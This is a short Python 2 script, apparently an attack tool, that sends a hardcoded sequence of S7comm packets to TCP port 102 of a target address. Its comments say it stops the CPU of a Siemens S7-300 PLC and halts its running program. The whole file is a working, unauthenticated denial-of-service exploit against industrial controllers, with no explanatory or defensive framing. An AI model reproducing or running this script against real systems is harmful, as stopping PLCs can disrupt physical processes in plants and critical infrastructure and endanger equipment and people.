#!/usr/bin/env python
#Siemens S7 300 stop CPU packet.
#Fire this at a PLC to stop its task.
#Will stop running.
import socket
import sys

if __name__ == "__main__":
	a="\x03\x00\x00\x16\x11\xe0\x00\x00"
	a+="\x00\x01\x00\xc1\x02\x01\x00\xc2"
	a+="\x02\x01\x02\xc0\x01\x09"
	a+="\x03\x00\x00\x19\x02\xf0\x80\x32"
	a+="\x01\x00\x00\xff\xff\x00\x08\x00"
	a+="\x00\xf0\x00\x00\x01\x00\x01\x03"
	a+="\xc0"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x00\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x40\x00\x01\x84\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x21\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x02\x00\x10\x00"
	a+="\x00\x29\x00\x00\x00\x00\x00\x09"
	a+="\x50\x5f\x50\x52\x4f\x47\x52\x41"
	a+="\x4d"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	a+="\x03\x00\x00\x1f\x02\xf0\x80\x32"
	a+="\x01\x00\x00\x00\x01\x00\x0e\x00"
	a+="\x00\x04\x01\x12\x0a\x10\x02\x00"
	a+="\x10\x00\x00\x83\x00\x00\x00"
	print "Sending to %s\n" % sys.argv[1]
	s = socket.socket()
	s.connect((sys.argv[1],102))
	s.send(a)
	s.close()
	print "Done."
